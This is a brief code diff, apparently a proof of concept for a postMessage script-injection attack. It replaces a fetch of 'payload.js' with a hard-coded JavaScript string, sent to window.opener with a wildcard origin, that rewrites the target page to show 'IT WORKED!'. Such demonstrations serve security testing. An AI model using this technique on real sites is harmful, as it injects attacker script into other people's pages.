@@ -1,8 +1,5 @@
 <script>
-fetch('payload.js')
-  .then(r => r.text())
-  .then(code => {
-    window.opener.postMessage({ maVariable: code }, '*');
-    window.close();
-  };
+payload = "document.body.innerHTML = '<h1 style=\'color:red; text-align:center; margin-top:20%;\'>IT WORKED!</h1>';";
+window.opener.postMessage({maVariable: payload}, '*');
+window.close();
 </script>
